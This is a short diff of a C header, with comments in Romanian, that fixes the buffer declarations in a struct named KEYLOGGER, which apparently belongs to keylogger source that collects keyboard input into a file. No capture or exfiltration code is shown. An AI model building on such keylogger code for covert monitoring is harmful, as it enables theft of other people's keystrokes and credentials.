@@ -22,7 +22,7 @@
         char* write_buffer; //acesta este pentru scrierea datelor colectate in keyboard_read_buffer
         size_t keyboard_read_buffer_offset;
         loff_t offset_in_file;
-        char *main_buffer[BUFF_SIZE];
-        char *back_buffer[BUFF_SIZE];
+        char main_buffer[BUFF_SIZE];
+        char back_buffer[BUFF_SIZE];
     }KEYLOGGER;
 #endif
